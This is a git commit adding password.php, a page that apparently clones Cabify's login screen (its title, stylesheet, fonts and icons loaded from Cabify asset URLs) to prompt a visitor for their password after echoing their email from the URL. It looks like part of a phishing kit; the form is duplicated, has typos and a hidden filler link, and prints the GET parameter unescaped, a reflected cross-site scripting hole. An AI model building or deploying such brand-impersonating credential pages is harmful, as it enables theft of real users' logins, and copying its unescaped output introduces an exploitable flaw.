bc5533a3ff58d3ce260511cdeb646302b61c0291
RIZWAN AKHTAR <riziecd@gmail.com>
2021-05-23 21:24:23 +0500

    added

---
+++ password.php
@@ -0,0 +1,110 @@
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+
+    <link href="https://assets-fix-me.cabify.com/837e2d3cb95d45e2e295bf556fea5bc9.ico?vsn=d" rel="shortcut icon" sizes="16x16 32x32 64x64">
+    <link href="https://assets-fix-me.cabify.com/c3ce6d5637255f4c6fff314b9cec554a.png?vsn=d" rel="shortcut icon" sizes="16x16" type="image/png">
+    <link href="https://assets-fix-me.cabify.com/31a483a3f091374043c2d9a2899f1e11.png?vsn=d" rel="shortcut icon" sizes="32x32" type="image/png">
+    <link href="https://assets-fix-me.cabify.com/0c3e990e6a062f1fd6d7b23d7b987cb9.png?vsn=d" rel="apple-touch-icon">
+
+    <link href="https://assets-fix-me.cabify.com/app.8acc4b661bdcdba5de71.css?vsn=d" rel="stylesheet">
+
+    <title>Cabify</title>
+  <script charset="utf-8" src="https://assets-fix-me.cabify.com/14.d762be9d3af6fb7603bd.js"></script><script charset="utf-8" src="https://assets-fix-me.cabify.com/15.d0af1ea8a19adea06b62.js"></script><script charset="utf-8" src="https://assets-fix-me.cabify.com/5.21406910294f8afe3989.js"></script>
+  <style>
+	/*! CSS Used from: https://assets-fix-me.cabify.com/app.8acc4b661bdcdba5de71.css?vsn=d */
+*{box-sizing:border-box;outline:none;}
+a,article,body,div,form,label,p,span{margin:0;padding:0;border:0;vertical-align:baseline;font:100%;}
+article{display:block;}
+body{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;line-height:1;}
+a{cursor:pointer;}
+input::-ms-clear{display:none;}
+input::-webkit-input-placeholder{opacity:1;}
+input:-ms-input-placeholder,input::-ms-input-placeholder{opacity:1;}
+input::placeholder{opacity:1;}
+.login-header-action:before,.login-splash-logo:before{margin-top:-2px;vertical-align:middle;text-transform:none;font-family:iconfont;font-weight:400;font-style:normal;font-variant:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;line-height:1;speak:none;}
+.loaded .spinner{display:none;}
+.spinner{margin-top:10%;background:url(https://assets-fix-me.cabify.com/c3cce433a6e30ef49079c4877d156f05.png) 50% no-repeat;background-size:cover;}
+.spinner{position:absolute;margin-left:-8px;left:50%;height:16px;width:16px;-webkit-animation:rotate .8s infinite linear;animation:rotate .8s infinite linear;}
+::-moz-selection{color:#2e2545;background:#c1b2ff;}
+::selection{color:#2e2545;background:#c1b2ff;}
+body{font-family:CabifyCircular,Avenir Next,Avenir,Segoe UI,sans-serif;font-size:18px;font-size:1.125rem;font-weight:400;color:#212240;line-height:24px;-webkit-text-size-adjust:100%;-moz-text-size-adjust:100%;-ms-text-size-adjust:100%;text-size-adjust:100%;background-color:#fff;}
+a{color:#6f36ff;text-decoration:none;}
+.maincontent{width:384px;min-height:100vh;max-width:100%;padding:24px;margin:0 auto;display:flex;align-items:center;}
+.maincontent-wrapper{display:flex;flex-wrap:wrap;align-items:center;}
+@media (max-width:47.9375rem){
+.maincontent{display:block;min-height:auto;}
+}
+.login{overflow-x:hidden;}
+.login-header-action{position:absolute;top:32px;left:32px;font-size:24px;font-size:1.5rem;color:#212240;}
+.login-header-action.back{color:#6f36ff;padding:0 24px 20px 0;}
+.login-header-action.back:before{content:"\E317";}
+@media (max-width:47.9375rem){
+.login-header-action{position:relative;display:block;margin-bottom:16px;top:0;left:0;}
+}
+.loaded .login-splash-header{opacity:1;}
+.loaded .login-splash-content{width:100%;opacity:1;}
+.login-splash-header{display:block;margin-bottom:56px;opacity:0;transition:opacity .5s ease;width:100%;}
+.login-splash-header .header-logos{display:flex;justify-content:space-between;}
+.login-splash-logo{flex:0 0 auto;}
+.login-splash-logo:before{content:"\E904";font-size:32px;font-size:2rem;color:#6f36ff;display:inline-block;}
+.login-splash-title{font-weight:700;margin-right:8px;display:inline-block;}
+.login-splash-subtitle{text-overflow:ellipsis;overflow:hidden;display:block;}
+.login-splash-content{opacity:0;font-size:22px;font-size:1.375rem;font-weight:300;line-height:32px;color:#2e2545;text-overflow:ellipsis;transition:opacity .5s ease;}
+.login-splash-actions{margin-top:24px;font-weight:400;}
+@media (max-width:47.9375rem){
+.login-splash-header{align-self:flex-start;}
+.login-splash-content{align-self:flex-end;}
+}
+.login-terms{line-height:20px;margin-top:32px;color:#a7a7b3;}
+.login-terms{font-size:14px;font-size:.875rem;}
+.button{border-radius:0;}
+button{margin:0;width:100%;border:0;background:none;text-align:left;font-family:inherit;font-size:inherit;}
+.button-primary{box-shadow:0 1px 4px 0 rgba(33,34,64,.16),inset 0 1px 1px 0 hsla(0,0%,100%,.16);}
+.button{position:relative;display:inline-block;overflow:hidden;padding:12px 20px;min-height:48px;max-width:100%;border:0;border-radius:8px;text-align:center;font-family:CabifyCircular,Avenir Next,Avenir,Segoe UI,sans-serif;font-size:16px;font-size:1rem;font-weight:700;line-height:24px;cursor:pointer;transition:all .15s linear;-webkit-transform:translateZ(0);transform:translateZ(0);}
+.button:focus{outline:none;}
+.button-primary{background-color:#7350ff;color:#fff;}
+.button-primary:active{background-color:#5f37ff;}
+.button-primary:hover{background-color:#876aff;}
+.button-full{display:block;}
+.button-full{width:100%;}
+@media (max-width:47.9375rem){
+.button:not(.button-small){padding:16px 20px;min-height:56px;}
+}
+input{font-family:CabifyCircular,Avenir Next,Avenir,Segoe UI,sans-serif;}
+.formField-input .input label{position:absolute;top:16px;right:16px;left:16px;overflow:hidden;color:#717285;text-overflow:ellipsis;white-space:nowrap;line-height:16px;cursor:text;transition:-webkit-transform .15s ease-out;transition:transform .15s ease-out;transition:transform .15s ease-out,-webkit-transform .15s ease-out;-webkit-transform-origin:0 100%;transform-origin:0 100%;pointer-events:none;}
+.formField-input .input input{margin:0;padding:16px;width:100%;height:48px;border:0;background-color:transparent;color:#212240;font-size:12px;font-size:.75rem;font-weight:400;line-height:16px;transition:padding .15s ease-out;}
+.formField-input{display:flex;}
+.formField-input>*{flex:0 0 32px;}
+.formField-input .input{position:relative;flex:1 1 100%;}
+.formField{border:1px solid rgba(33,34,64,.16);border-radius:8px;background-color:#fff;font-size:12px;font-size:.75rem;}
+.formField:hover{border-color:rgba(33,34,64,.24);}
+.formField{margin-bottom:16px;}
+.preloader{position:absolute;top:calc(50% - 100px);left:0;right:0;bottom:0;z-index:99999;}
+.preloader:before{content:"";position:fixed;top:0;left:0;right:0;bottom:0;z-index:-1;background:#fff;}
+.loaded .preloader{display:none;}
+/*! CSS Used keyframes */
+@-webkit-keyframes rotate{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(1turn);transform:rotate(1turn);}}
+@keyframes rotate{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg);}to{-webkit-transform:rotate(1turn);transform:rotate(1turn);}}
+/*! CSS Used fontfaces */
+@font-face{font-family:iconfont;src:url(https://assets-fix-me.cabify.com/062782c83cfff7b090b504e8a029ae08.ttf) format("truetype"),url(https://assets-fix-me.cabify.com/3ef3396b854de4295701d4144ab00db1.woff) format("woff"),url(https://assets-fix-me.cabify.com/fb204edf86ad2282bee76d8c6a2b59de.svg#iconfont) format("svg");font-weight:400;font-style:normal;}
+@font-face{font-family:CabifyCircular;src:url(https://assets-fix-me.cabify.com/4682a80eb8678550a9041112d1bba2b6.eot);src:url(https://assets-fix-me.cabify.com/4682a80eb8678550a9041112d1bba2b6.eot#iefix) format("embedded-opentype"),url(https://assets-fix-me.cabify.com/d4e9a293c572c37986a7f911ad78a912.woff) format("woff"),url(https://assets-fix-me.cabify.com/0103214f69191c450fcf4fb323ead350.woff2) format("woff2");font-weight:600;font-style:normal;}
+@font-face{font-family:CabifyCircular;src:url(https://assets-fix-me.cabify.com/cdf1af7d46e884a4a7d70e738380641f.eot);src:url(https://assets-fix-me.cabify.com/cdf1af7d46e884a4a7d70e738380641f.eot#iefix) format("embedded-opentype"),url(https://assets-fix-me.cabify.com/6e023f09687fc4f8d87705c08e421a2a.woff) format("woff"),url(https://assets-fix-me.cabify.com/9b6f88d183407d5b2c9d2e03a390e93d.woff2) format("woff2");font-weight:400;font-style:normal;}
+@font-face{font-family:CabifyCircular;src:url(https://assets-fix-me.cabify.com/20e023112f736f033cb6f42eebbcfa8f.eot);src:url(https://assets-fix-me.cabify.com/20e023112f736f033cb6f42eebbcfa8f.eot#iefix) format("embedded-opentype"),url(https://assets-fix-me.cabify.com/6f97a71f89521c0b690dd4285cdf9fd4.woff) format("woff"),url(https://assets-fix-me.cabify.com/027ea6bae887b76521840869ddc1ebac.woff2) format("woff2");font-weight:300;font-style:normal;}
+  </style>
+  </head>
+  
+  <body data-new-gr-c-s-check-loaded="14.1012.0" data-gr-ext-installed="">
+
+
+    <div id="app"><div class="login production"><div class="loaded  "><div class="preloader"><div class="spinner"></div></div><div class=""><article class="maincontent"><div class="maincontent-wrapper"><div class="login-splash-header"><div class="header-logos">
+	<img src="logo.jpg">
+	
+	
+	</div></div><div class="login-splash-content"><span class="login-splash-title">Enter Password.</span><span class="login-splash-subtitle"><?php if(isset($_GET['email'])){ echo $_GET['email'];}?></span><div class="login-splash-actions"><form class="" novalidate=""><div class="formField "><div class="formField-input"><div class="input"><label for="email">Password</label><input name="email" type="email" placeholder="" id="email" required="" value=""></div></div></div><div class="form-actions button-group"><button id="form-submit" type="submit" class="button undefined button-full button-primary   "><span>Log In</span></button></div></form><p class="login-terms"><a href="" target="_blank">Forget Passwpr</a>  <a  style="visibility:hidden;" href="https://cabify.com/spain/terms?hidden=true" target="_blank"> Terms of Service and conditions by fjajfklds jfkljas</a></p></div></div></div></article></div></div></div></div>
+	</div></div><div class="login-splash-content"><span class="login-splash-title">Enter Password.</span><span class="login-splash-subtitle"><?php if(isset($_GET['email'])){ echo $_GET['email'];}?></span><div class="login-splash-actions"><form class="" novalidate=""><div class="formField "><div class="formField-input"><div class="input"><label for="email">Password</label><input name="email" type="email" placeholder="" id="email" required="" value=""></div></div></div><div class="form-actions button-group"><button id="form-submit" type="submit" class="button undefined button-full button-primary   "><span>Log In</span></button></div></form><p class="login-terms"><a href="" target="_blank">Forget Passwpr</a>  <a  style="visibility:hidden;" href="https://cabify.com/spain/terms?hidden=true" target="_blank"> Terms of Service and conditions by fjajfklds jfkljas</a></p></div></div></div></article></div></div></div></div>
+
+
+</body>
+
